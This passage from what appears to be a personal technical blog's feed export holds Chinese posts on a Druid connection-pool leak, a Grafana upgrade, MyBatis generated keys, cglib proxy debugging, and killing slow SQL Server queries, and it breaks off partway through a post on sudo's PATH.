class="line">	at com.microsoft.sqlserver.jdbc.SQLServerException.ConvertConnectExceptionToSQLServerException(SQLServerException.java:241)</span><br><span class="line">	at com.microsoft.sqlserver.jdbc.SocketFinder.findSocket(IOBuffer.java:2243)</span><br><span class="line">	at com.microsoft.sqlserver.jdbc.TDSChannel.open(IOBuffer.java:491)</span><br><span class="line">	at com.microsoft.sqlserver.jdbc.SQLServerConnection.connectHelper(SQLServerConnection.java:1309)</span><br><span class="line">	</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">2020-04-09 17:33:09.338 ERROR [pms-provider-prod,69497e80a3d973de,69497e80a3d973de,<span class="literal">false</span>] --- [io-11022-exec-9] c.a.m.h.m.i.MyBatisMigrateChainIdKiller  : migrate.helper.MyBatisMigrateChainIdKillerError处理过程出现错误,</span><br><span class="line"></span><br><span class="line">org.springframework.jdbc.CannotGetJdbcConnectionException: Failed to obtain JDBC Connection; nested exception is com.microsoft.sqlserver.jdbc.SQLServerException: Database <span class="string">'xxx'</span> cannot be opened. It is <span class="keyword">in</span> the middle of a restore.</span><br><span class="line">	at org.springframework.jdbc.datasource.DataSourceUtils.getConnection(DataSourceUtils.java:81)</span><br><span class="line">	at org.mybatis.spring.transaction.SpringManagedTransaction.openConnection(SpringManagedTransaction.java:82)</span><br><span class="line">	...</span><br><span class="line">Caused by: com.microsoft.sqlserver.jdbc.SQLServerException: Database <span class="string">'xxxx'</span> cannot be opened. It is <span class="keyword">in</span> the middle of a restore.</span><br><span class="line">	at com.microsoft.sqlserver.jdbc.SQLServerException.makeFromDatabaseError(SQLServerException.java:216)</span><br><span class="line">	at com.microsoft.sqlserver.jdbc.TDSTokenHandler.onEOF(tdsparser.java:254)</span><br><span class="line">	at com.microsoft.sqlserver.jdbc.TDSParser.parse(tdsparser.java:84)</span><br><span class="line">	at com.microsoft.sqlserver.jdbc.TDSParser.parse(tdsparser.java:39)</span><br><span class="line">	at com.microsoft.sqlserver.jdbc.SQLServerConnection<span class="variable">$1ConnectionCommand</span>.doExecute(SQLServerConnection.java:1756)</span><br><span class="line">	at com.microsoft.sqlserver.jdbc.TDSCommand.execute(IOBuffer.java:5696)</span><br><span class="line">	at com.microsoft.sqlserver.jdbc.SQLServerConnection.executeCommand(SQLServerConnection.java:1715)</span><br><span class="line">	at com.microsoft.sqlserver.jdbc.SQLServerConnection.connectionCommand(SQLServerConnection.java:1761)</span><br><span class="line">	at com.microsoft.sqlserver.jdbc.SQLServerConnection.setCatalog(SQLServerConnection.java:2063)</span><br><span class="line">	at com.alibaba.druid.filter.FilterChainImpl.connection_setCatalog(FilterChainImpl.java:750)</span><br><span class="line">	at com.alibaba.druid.filter.FilterAdapter.connection_setCatalog(FilterAdapter.java:991)</span><br><span class="line">	at com.alibaba.druid.filter.FilterChainImpl.connection_setCatalog(FilterChainImpl.java:745)</span><br><span class="line">	at com.alibaba.druid.filter.FilterAdapter.connection_setCatalog(FilterAdapter.java:991)</span><br><span class="line">	at com.alibaba.druid.filter.FilterChainImpl.connection_setCatalog(FilterChainImpl.java:745)</span><br><span class="line">	at com.alibaba.druid.filter.FilterAdapter.connection_setCatalog(FilterAdapter.java:991)</span><br><span class="line">	at com.alibaba.druid.filter.FilterChainImpl.connection_setCatalog(FilterChainImpl.java:745)</span><br><span class="line">	at com.alibaba.druid.filter.FilterAdapter.connection_setCatalog(FilterAdapter.java:991)</span><br><span class="line">	at com.alibaba.druid.filter.FilterChainImpl.connection_setCatalog(FilterChainImpl.java:745)</span><br><span class="line">	at com.alibaba.druid.filter.FilterAdapter.connection_setCatalog(FilterAdapter.java:991)</span><br><span class="line">	at com.alibaba.druid.filter.FilterChainImpl.connection_setCatalog(FilterChainImpl.java:745)</span><br><span class="line">	at com.alibaba.druid.filter.FilterAdapter.connection_setCatalog(FilterAdapter.java:991)</span><br><span class="line">	at com.alibaba.druid.filter.FilterChainImpl.connection_setCatalog(FilterChainImpl.java:745)</span><br><span class="line">	at com.alibaba.druid.proxy.jdbc.ConnectionProxyImpl.setCatalog(ConnectionProxyImpl.java:437)</span><br><span class="line">	at com.alibaba.druid.pool.DruidPooledConnection.setCatalog(DruidPooledConnection.java:910)</span><br><span class="line">	at com.atour.db.DynamicDataSource.getConnection(DynamicDataSource.java:143)</span><br><span class="line">	at org.springframework.jdbc.datasource.DataSourceUtils.fetchConnection(DataSourceUtils.java:151)</span><br><span class="line">	at org.springframework.jdbc.datasource.DataSourceUtils.doGetConnection(DataSourceUtils.java:115)</span><br><span class="line">	at org.springframework.jdbc.datasource.DataSourceUtils.getConnection(DataSourceUtils.java:78)</span><br><span class="line">  ... 131 common frames omitted</span><br></pre></td></tr></table></figure>
<p>异常栈中关键的代码：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> Connection <span class="title">getConnection</span><span class="params">()</span> <span class="keyword">throws</span> SQLException </span>&#123;</span><br><span class="line">	Connection connection = <span class="keyword">this</span>.determineTargetDataSource().getConnection();</span><br><span class="line">	<span class="keyword">if</span>(dynamicInstance) &#123;</span><br><span class="line">		<span class="comment">/**数据源创建到实例维度，获取连接之前设置数据库名*/</span></span><br><span class="line">    <span class="comment">// 这里setCatalog抛出了异常</span></span><br><span class="line">		connection.setCatalog(databaseNameMap.get(DynamicDataSourceHolder.getDataSouce()));</span><br><span class="line">	&#125;</span><br><span class="line">    <span class="keyword">return</span> connection;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>首先druid的配置没有设置<code>testOnBorrow</code>，拿到连接之后没有校验连接的有效性；</p>
<p>其次，由于分库太多（实例没有那么多），公司开发了中间件，动态切换数据库（就是上面的代码，一个druid实例默认就有一个Create线程和Destroy线程，有上百分库的时候，开销就相当大）。</p>
<p><strong>连接池的变化</strong></p>
<p>数据库刚开始断开的时候，业务线程拿到连接之后，执行<code>setCatalog</code>操作，此时会失败，然后没有catch关闭对应的数据库连接，就会占用druid的一个active count；</p>
<p>中间有创建连接Druid-ConnectionPool-C<code>reate-219971169</code>， 尝试创建，然后失败了。</p>
<p>后续数据库应该可以连上了，但是切换分库会有问题，也会占用druid的一个active count；</p>
<p>最终active count 会被占满，然后就无法创建连接，业务线程和连接创建线程都会一直等待。</p>
<h2 id="改进"><a href="#改进" class="headerlink" title="改进"></a>改进</h2><ul>
<li><p>必须设置获取连接的等待时间（maxWait) 和最大等待线程个数（maxWaitThreadCount）。</p>
</li>
<li><p>操作连接的时候，一定要在异常的情况下关闭连接，不要造成连接的泄露</p>
</li>
<li>可以设置druid的<ul>
<li><code>removeAbandoned</code> （是否强制关闭连接时长大于removeAbandonedTimeoutMillis的连接）</li>
<li><code>removeAbandonedTimeoutMillis</code> （一个连接从被连接到被关闭之间的最大生命周期）</li>
<li><code>logAbandoned</code> （强制关闭连接时是否记录日志）</li>
</ul>
</li>
</ul>
]]></content>
      
        <categories>
            
            <category> druid </category>
            
        </categories>
        
        
        <tags>
            
            <tag> druid </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[mediawiki-plantuml]]></title>
      <url>http://qsli.github.io/2020/03/23/mediawiki-plantuml/</url>
      <content type="html"><![CDATA[<p>mediawiki的plantuml插件，在渲染中文的时候，发现文字丢了。</p>
<img src="/2020/03/23/mediawiki-plantuml/WeChatWorkScreenshot_0e466b8c-c8f5-48c4-bcab-45db7ddbf597.png">
<p>方框里中文的说明都没有了，最后发现是缺少字体，这里mark下。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo yum install cjkuni-uming-fonts</span><br></pre></td></tr></table></figure>
<p>安装完字体就好了:</p>
<img src="/2020/03/23/mediawiki-plantuml/uml-13d5bec9d5aa4740c2198be487d50707-b9db094fe17005d80a48cfc93309f835.png">]]></content>
      
        <categories>
            
            <category> mediawiki </category>
            
        </categories>
        
        
        <tags>
            
            <tag> plantuml </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[cglib-tips]]></title>
      <url>http://qsli.github.io/2020/03/23/cglib-tips/</url>
      <content type="html"><![CDATA[<ul>
<li>设置debug的环境变量</li>
</ul>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 该设置用于输出cglib动态代理产生的类</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">System.setProperty(DebuggingClassWriter.DEBUG_LOCATION_PROPERTY, <span class="string">"/tmp/"</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 该设置用于输出jdk动态代理产生的类</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">System.getProperties().put(<span class="string">"sun.misc.ProxyGenerator.saveGeneratedFiles"</span>, <span class="string">"true"</span>);</span><br></pre></td></tr></table></figure>
<img src="/2020/03/23/cglib-tips/image-20200322181246078.png">
<ul>
<li>或者使用 HSDB（Hotspot的debug工具）</li>
</ul>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo java -classpath <span class="string">"/Library/Java/JavaVirtualMachines/jdk1.8.0_181.jdk/Contents/Home/lib/sa-jdi.jar"</span>  sun.jvm.hotspot.HSDB</span><br></pre></td></tr></table></figure>
<p>attach到指定的进程之后，选择class browser，就可以找到动态生成的类</p>
<img src="/2020/03/23/cglib-tips/image-20200322181636481.png">
<p>点进去</p>
<img src="/2020/03/23/cglib-tips/image-20200322181729901.png">
<p>会在当前目录生成对应的class文件：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">➜  /tmp  tree</span><br><span class="line">.</span><br><span class="line">├── com</span><br><span class="line">│   └── air</span><br><span class="line">│       └── mvc</span><br><span class="line">│           └── SampleController$<span class="variable">$EnhancerBySpringCGLIB</span>$<span class="variable">$d680c039</span>.class</span><br></pre></td></tr></table></figure>
<p>对应的class文件就创建了，可以拖到idea或者其他的工具中查看，也可以查看类的继承关系</p>
<img src="/2020/03/23/cglib-tips/image-20200322181908616.png">]]></content>
      
        <categories>
            
            <category> spring </category>
            
        </categories>
        
        
        <tags>
            
            <tag> cglib </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[升级grafana]]></title>
      <url>http://qsli.github.io/2019/01/10/grafana-upgrade/</url>
      <content type="html"><![CDATA[<h2 id="缘起"><a href="#缘起" class="headerlink" title="缘起"></a>缘起</h2><p>目前的grafana版本过低，只有在状态变化的时候才发送报警的提醒</p>
<blockquote>
<p>Grafana sends notifications on state changes, so OK -&gt; Alerting, Alerting -&gt; OK, OK -&gt; NoData, etc</p>
</blockquote>
<p>高版本有work around可以解决：</p>
<blockquote>
<p>This is possible since 5.3 if you configure alert reminder at the same or lower interval as the alert rule.</p>
<p>It’s not exactly what’s described in this issue but its close enough that we won’t implement this feature.</p>
</blockquote>
<h2 id="当前配置信息"><a href="#当前配置信息" class="headerlink" title="当前配置信息"></a>当前配置信息</h2><p>当前版本：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[qisheng.li@yd-devops-web yum.repos.d]$ sudo yum list installed | grep grafana</span><br><span class="line">grafana.x86_64                        4.6.3-1                        installed</span><br></pre></td></tr></table></figure>
<p>启动脚本：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[qisheng.li@yd-devops-web yum.repos.d]$ ps axu | grep grafana</span><br><span class="line">qisheng+ 24599  0.0  0.0 112660   976 pts/1    S+   14:10   0:00 grep --color=auto grafana</span><br><span class="line">grafana  28995  0.9  0.2 2414524 46008 ?       Ssl  Jan08  28:22 /usr/sbin/grafana-server --config=/etc/grafana/grafana.ini --pidfile=/var/run/grafana/grafana-server.pid cfg:default.paths.logs=/var/<span class="built_in">log</span>/grafana cfg:default.paths.data=/var/lib/grafana cfg:default.paths.plugins=/var/lib/grafana/plugins</span><br></pre></td></tr></table></figure>
<p>LDAP配置：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#################################### Auth LDAP ##########################</span></span><br><span class="line">[auth.ldap]</span><br><span class="line">enabled = <span class="literal">true</span></span><br><span class="line">config_file = /etc/grafana/ldap.toml</span><br><span class="line">allow_sign_up = <span class="literal">true</span></span><br></pre></td></tr></table></figure>
<h2 id="风险评估"><a href="#风险评估" class="headerlink" title="风险评估"></a>风险评估</h2><p>grafana只是作为展示层，升级对程序打点和数据收集无影响，而且grafana是后向兼容的；升级只会影响监控的查看和报警。</p>
<blockquote>
<p>We recommend everyone to upgrade Grafana often to stay up to date with the latest fixes and enhancements. In order make this a reality Grafana upgrades are backward compatible and the upgrade process is simple &amp; quick.</p>
</blockquote>
<h2 id="升级步骤"><a href="#升级步骤" class="headerlink" title="升级步骤"></a>升级步骤</h2><h3 id="备份配置文件"><a href="#备份配置文件" class="headerlink" title="备份配置文件"></a>备份配置文件</h3><ul>
<li>/etc/grafana/grafana.ini </li>
<li>/etc/grafana/ldap.toml</li>
</ul>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[qisheng.li@yd-devops-web yum.repos.d]$ sudo cp -p /etc/grafana/ldap.toml ~/</span><br><span class="line">[qisheng.li@yd-devops-web yum.repos.d]<span class="variable">$sudo</span> cp -p  /etc/grafana/grafana.ini  ~/</span><br></pre></td></tr></table></figure>
<h3 id="备份db"><a href="#备份db" class="headerlink" title="备份db"></a>备份db</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[qisheng.li@yd-devops-web yum.repos.d]$ sudo cp -p /var/lib/grafana/grafana.db ~/</span><br></pre></td></tr></table></figure>
<h3 id="更新yum源"><a href="#更新yum源" class="headerlink" title="更新yum源"></a>更新yum源</h3><p>aliyun的yum的最新版本是<code>4.6.3</code>是我们当前使用的版本</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">[qisheng.li@yd-devops-web yum.repos.d]$ yum info grafana</span><br><span class="line">Loaded plugins: fastestmirror</span><br><span class="line">Loading mirror speeds from cached hostfile</span><br><span class="line"> * base: mirrors.aliyun.com</span><br><span class="line"> * extras: mirrors.aliyun.com</span><br><span class="line"> * updates: mirrors.aliyun.com</span><br><span class="line">Installed Packages</span><br><span class="line">Name        : grafana</span><br><span class="line">Arch        : x86_64</span><br><span class="line">Version     : 4.6.3</span><br><span class="line">Release     : 1</span><br><span class="line">Size        : 133 M</span><br><span class="line">Repo        : installed</span><br><span class="line">Summary     : Grafana</span><br><span class="line">URL         : https://grafana.com</span><br><span class="line">License     : <span class="string">"Apache 2.0"</span></span><br><span class="line">Description : Grafana</span><br></pre></td></tr></table></figure>
<p>添加grafana的源<a href="http://docs.grafana.org/installation/rpm/" rel="external nofollow noopener noreferrer" target="_blank">Installing on RPM-based Linux | Grafana Documentation</a></p>
<p>新建配置文件<code>/etc/yum.repos.d/grafana.repo</code></p>
<p>键入一下内容：</p>
<figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="section">[grafana]</span></span><br><span class="line"><span class="attr">name</span>=grafana</span><br><span class="line"><span class="attr">baseurl</span>=https://packages.grafana.com/oss/rpm</span><br><span class="line"><span class="attr">repo_gpgcheck</span>=<span class="number">1</span></span><br><span class="line"><span class="attr">enabled</span>=<span class="number">1</span></span><br><span class="line"><span class="attr">gpgcheck</span>=<span class="number">1</span></span><br><span class="line"><span class="attr">gpgkey</span>=https://packages.grafana.com/gpg.key</span><br><span class="line"><span class="attr">sslverify</span>=<span class="number">1</span></span><br><span class="line"><span class="attr">sslcacert</span>=/etc/pki/tls/certs/ca-bundle.crt</span><br></pre></td></tr></table></figure>
<p>grafana也提供了beta的源，生产环境不建议使用。</p>
<p>再次查看yum信息</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">[qisheng.li@yd-devops-web yum.repos.d]$ yum info grafana</span><br><span class="line">Loaded plugins: fastestmirror</span><br><span class="line">Loading mirror speeds from cached hostfile</span><br><span class="line"> * base: mirrors.aliyun.com</span><br><span class="line"> * extras: mirrors.aliyun.com</span><br><span class="line"> * updates: mirrors.aliyun.com</span><br><span class="line">Installed Packages</span><br><span class="line">Name        : grafana</span><br><span class="line">Arch        : x86_64</span><br><span class="line">Version     : 4.6.3</span><br><span class="line">Release     : 1</span><br><span class="line">Size        : 133 M</span><br><span class="line">Repo        : installed</span><br><span class="line">Summary     : Grafana</span><br><span class="line">URL         : https://grafana.com</span><br><span class="line">License     : <span class="string">"Apache 2.0"</span></span><br><span class="line">Description : Grafana</span><br><span class="line"></span><br><span class="line">Available Packages</span><br><span class="line">Name        : grafana</span><br><span class="line">Arch        : x86_64</span><br><span class="line">Version     : 5.4.2</span><br><span class="line">Release     : 1</span><br><span class="line">Size        : 52 M</span><br><span class="line">Repo        : grafana</span><br><span class="line">Summary     : Grafana</span><br><span class="line">URL         : https://grafana.com</span><br><span class="line">License     : <span class="string">"Apache 2.0"</span></span><br><span class="line">Description : Grafana</span><br></pre></td></tr></table></figure>
<p>可以拿到<code>5.4.2</code>的信息了</p>
<h3 id="升级版本"><a href="#升级版本" class="headerlink" title="升级版本"></a>升级版本</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[qisheng.li@yd-devops-web yum.repos.d]$ sudo yum update grafana</span><br></pre></td></tr></table></figure>
<h2 id="配置reminder"><a href="#配置reminder" class="headerlink" title="配置reminder"></a>配置reminder</h2><p><img src="image-20190110234737778.png" alt="image-20190110234737778"></p>
<p>这样如果处于alert状态就会每隔30s报一次</p>
<p><img src="image-20190110234843905.png" alt="image-20190110234843905"></p>
<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><ul>
<li><a href="https://github.com/grafana/grafana/issues/12356" rel="external nofollow noopener noreferrer" target="_blank">Send alert notification for every alert eval regardless of state · Issue #12356 · grafana/grafana</a></li>
<li><a href="http://docs.grafana.org/installation/upgrading/" rel="external nofollow noopener noreferrer" target="_blank">Upgrading | Grafana Documentation</a></li>
<li><a href="https://github.com/grafana/grafana/issues/7277" rel="external nofollow noopener noreferrer" target="_blank">[Question] Alert notify only once ? · Issue #7277 · grafana/grafana</a></li>
<li><a href="http://docs.grafana.org/installation/rpm/" rel="external nofollow noopener noreferrer" target="_blank">Installing on RPM-based Linux | Grafana Documentation</a></li>
</ul>
]]></content>
      
        <categories>
            
            <category> linux </category>
            
        </categories>
        
        
        <tags>
            
            <tag> grafana </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[mybatis-get-generated-id]]></title>
      <url>http://qsli.github.io/2019/01/06/mybatis-get-generated-id/</url>
      <content type="html"><![CDATA[<h2 id="mybatis获取自增主键"><a href="#mybatis获取自增主键" class="headerlink" title="mybatis获取自增主键"></a>mybatis获取自增主键</h2><h3 id="使用useGeneratedKeys"><a href="#使用useGeneratedKeys" class="headerlink" title="使用useGeneratedKeys"></a>使用useGeneratedKeys</h3><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">insert</span> <span class="attr">id</span>=<span class="string">"add"</span> <span class="attr">parameterType</span>=<span class="string">"Staff"</span> <span class="attr">useGeneratedKeys</span>=<span class="string">"true"</span> <span class="attr">keyProperty</span>=<span class="string">"id"</span>&gt;</span></span><br><span class="line">  insert into Staff(name, age) values(#&#123;name&#125;, #&#123;age&#125;)</span><br><span class="line"><span class="tag">&lt;/<span class="name">insert</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p><code>useGeneratedKeys</code>既可以用于单条插入语句中获取自增主键，也可以用于多条语句中获取自增主键。</p>
<h3 id="使用-IDENTITY"><a href="#使用-IDENTITY" class="headerlink" title="使用@@IDENTITY"></a>使用@@IDENTITY</h3><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">insert</span> <span class="attr">id</span>=<span class="string">"add"</span> <span class="attr">parameterType</span>=<span class="string">"Staff"</span> <span class="attr">keyProperty</span>=<span class="string">"id"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">selectKey</span> <span class="attr">keyProperty</span>=<span class="string">"id"</span> <span class="attr">order</span>=<span class="string">"AFTER"</span> <span class="attr">resultType</span>=<span class="string">"java.lang.Integer"</span>&gt;</span></span><br><span class="line">			select @@IDENTITY</span><br><span class="line">    <span class="tag">&lt;/<span class="name">selectKey</span>&gt;</span></span><br><span class="line">    insert into Staff(name, age) values(#&#123;name&#125;, #&#123;age&#125;)</span><br><span class="line"><span class="tag">&lt;/<span class="name">insert</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>只支持一条插入时获取自增主键，而且跟数据库的支持有关.</p>
<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><ol>
<li><a href="https://www.cnblogs.com/fsjohnhuang/p/4078659.html" rel="external nofollow noopener noreferrer" target="_blank">MyBatis魔法堂：Insert操作详解（返回主键、批量插入） - ^_^肥仔John - 博客园</a></li>
<li><a href="https://buptubuntu.github.io/2017/07/16/Mybatis-Auto-Generate-Key/" rel="external nofollow noopener noreferrer" target="_blank">Mybatis Auto Generate Key | buptubuntu的博客</a></li>
<li><a href="http://www.mybatis.org/generator/configreference/generatedKey.html" rel="external nofollow noopener noreferrer" target="_blank">MyBatis Generator Core – The <generatedkey> Element</generatedkey></a></li>
</ol>
]]></content>
      
        <categories>
            
            <category> mybatis </category>
            
        </categories>
        
        
        <tags>
            
            <tag> 自增主键 </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[sqlserver杀掉慢查询]]></title>
      <url>http://qsli.github.io/2018/10/09/sqlserver-slow-killer/</url>
      <content type="html"><![CDATA[<h1 id="SQL"><a href="#SQL" class="headerlink" title="SQL"></a>SQL</h1><p>查询慢查询的信息：</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="keyword">DISTINCT</span></span><br><span class="line">    <span class="keyword">SUBSTRING</span>(qt.TEXT, (er.statement_start_offset/<span class="number">2</span>)+<span class="number">1</span>, ((<span class="keyword">CASE</span> er.statement_end_offset <span class="keyword">WHEN</span> <span class="number">-1</span> <span class="keyword">THEN</span> <span class="keyword">DATALENGTH</span>(qt.TEXT) <span class="keyword">ELSE</span> er.statement_end_offset <span class="keyword">END</span> - er.statement_start_offset)/<span class="number">2</span>)+<span class="number">1</span>) <span class="keyword">AS</span> query_sql,</span><br><span class="line">    er.session_id <span class="keyword">AS</span> pid,</span><br><span class="line">    er.status <span class="keyword">AS</span> <span class="keyword">status</span>,</span><br><span class="line">    er.command <span class="keyword">AS</span> command,</span><br><span class="line">    sp.hostname <span class="keyword">AS</span> hostname,</span><br><span class="line">    DB_NAME(sp.dbid) <span class="keyword">AS</span> db_name,</span><br><span class="line">    sp.program_name <span class="keyword">AS</span> program_name,</span><br><span class="line">    er.cpu_time <span class="keyword">AS</span> cpu_time,</span><br><span class="line">    er.total_elapsed_time <span class="keyword">AS</span> cost_time</span><br><span class="line"><span class="keyword">FROM</span> sys.sysprocesses <span class="keyword">AS</span> sp <span class="keyword">LEFT</span> <span class="keyword">JOIN</span> sys.dm_exec_requests <span class="keyword">AS</span> er <span class="keyword">ON</span> sp.spid = er.session_id</span><br><span class="line"><span class="keyword">CROSS</span> <span class="keyword">APPLY</span> sys.dm_exec_sql_text(er.sql_handle) <span class="keyword">AS</span> qt</span><br><span class="line"><span class="keyword">WHERE</span> <span class="number">1</span> = <span class="keyword">CASE</span> <span class="keyword">WHEN</span> er.status <span class="keyword">IN</span> (<span class="string">'RUNNABLE'</span>, <span class="string">'SUSPENDED'</span>, <span class="string">'RUNNING'</span>) <span class="keyword">THEN</span> <span class="number">1</span> <span class="keyword">WHEN</span> er.status = <span class="string">'SLEEPING'</span> <span class="keyword">AND</span> sp.open_tran  &gt; <span class="number">0</span> <span class="keyword">THEN</span> <span class="number">1</span> <span class="keyword">ELSE</span> <span class="number">0</span> <span class="keyword">END</span></span><br><span class="line"><span class="keyword">AND</span> er.command = <span class="string">'SELECT'</span></span><br><span class="line"><span class="keyword">ORDER</span> <span class="keyword">BY</span> er.total_elapsed_time <span class="keyword">DESC</span></span><br></pre></td></tr></table></figure>
<p>查询的结果如下：</p>
<img src="/2018/10/09/sqlserver-slow-killer/image-20181009091326051.png">
<p>结果中展示了session的<code>pid</code>以及正在执行的命令，消耗的cpu时间以及总的耗费时间，如果需要杀掉这个session，可以用下面的命令：</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">kill</span> &lt;pid&gt;</span><br></pre></td></tr></table></figure>
<h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><ol>
<li><a href="https://docs.microsoft.com/en-us/sql/t-sql/language-elements/kill-transact-sql?view=sql-server-2017" rel="external nofollow noopener noreferrer" target="_blank">KILL (Transact-SQL) | Microsoft Docs</a></li>
<li><a href="https://gist.github.com/alexsorokoletov/a079629f9e1435c7f81f" rel="external nofollow noopener noreferrer" target="_blank">Helpful functions when you need to find out what is going on on SQL Server</a></li>
</ol>
]]></content>
      
        <categories>
            
            <category> db </category>
            
        </categories>
        
        
        <tags>
            
            <tag> sqlserver-killer </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[sudo命令的环境路径]]></title>
      <url>http://qsli.github.io/2018/10/07/sudo-path/</url>
      <content type="html"><![CDATA[<p>运行sudo命令时，有时会提示：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[qisheng.li@yd_app_api_02 ~]$ sudo -u tomcat jstack 123</span><br><span class="line">sudo: jstack: <span class="built_in">command</span> not found</span><br></pre></td></tr></table></figure>
<p>但是查看<code>/etc/profile</code>可以看到:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">export</span> JAVA_HOME=/usr/<span class="built_in">local</span>/jdk/default</span><br><span class="line"><span class="built_in">export</span> PATH=<span class="variable">$JAVA_HOME</span>/bin:<span class="variable">$PATH</span></span><br><span class="line"><span class="built_in">export</span> CLASSPATH=.:<span class="variable">$JAVA_HOME</span>/lib/dt.jar:<span class="variable">$JAVA_HOME</span>/lib/tools.jar</span><br></pre></td></tr></table></figure>
<p>确实导出了环境变量，那么为什么运行的时候不成功呢？</p>
<p>换成如下的命令，可以找到:</p>
